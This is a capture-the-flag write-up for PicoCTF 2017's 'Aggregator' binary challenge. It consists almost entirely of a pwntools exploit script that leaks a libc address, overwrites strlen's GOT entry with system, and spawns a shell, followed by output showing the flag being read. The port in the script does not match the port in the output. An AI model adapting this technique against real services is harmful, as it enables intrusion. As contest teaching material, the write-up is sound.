# PicoCTF_2017: Aggregator

**Category:** Binary
**Points:** 190
**Description:**

I wrote a program to help me synthesize my log files. You can edit the log files to add annotations that will print out aggregated information. Because the original program that outputs the logs was a bit faulty, I also included the ability to clear a single day of logs.  
Find my aggregator running on shell2017.picoctf.com:7785. [aggregator.c](https://webshell2017.picoctf.com/static/2745e04028ecf1c8ae15c70bb085f5e6/aggregator.c)  [aggregator](https://webshell2017.picoctf.com/static/2745e04028ecf1c8ae15c70bb085f5e6/aggregator)

**Hint:**

Does it look like there is a stack vulnerability?

## Write-up
```python
#!/usr/bin/env python2

from pwn import *

from struct import pack,unpack

FREE_GOT_PLT = 0x601EF0

STRLEN_GOT_PLT = 0x601F00

FREE_OFFSET = 0x7c600

SYSTEM_OFFSET = 0x41490

r = remote("shell2017.picoctf.com", 8708)

r.send("09-24-2018 0\n")

r.send("~09-24-2018\n")

payload = pack("<Q",FREE_GOT_PLT)+pack("<Q",24)+pack("<Q",2)+pack("<Q",1)+pack("<Q",0)

r.send(payload+"\n")

r.recv()

r.send("ax 09-2018\n")

free_libc = int(r.recv().splitlines()[-1])

libc_base = free_libc-FREE_OFFSET

system_libc = libc_base+SYSTEM_OFFSET

r.send("09-25-2018 0\n")

r.send("~09-25-2018\n")

payload = pack("<Q",STRLEN_GOT_PLT)+pack("<Q",25)+pack("<Q",2)+pack("<Q",0)+pack("<Q",0)

r.send(payload+"\n")

r.send("09-25-2018 %d\n"%system_libc)

r.interactive()
```
```text
$ python solve.py 
[+] Opening connection to shell2017.picoctf.com on port 7785: Done
[*] Switching to interactive mode
$ ls
aggregator
flag.txt
xinetd_wrapper.sh
$ cat flag.txt
a65b3f946c058f6dbec3d14d8449a468
```
<!--stackedit_data:
eyJoaXN0b3J5IjpbNTEyNTUyMDAwLDM2NTI0MjgyXX0=
-->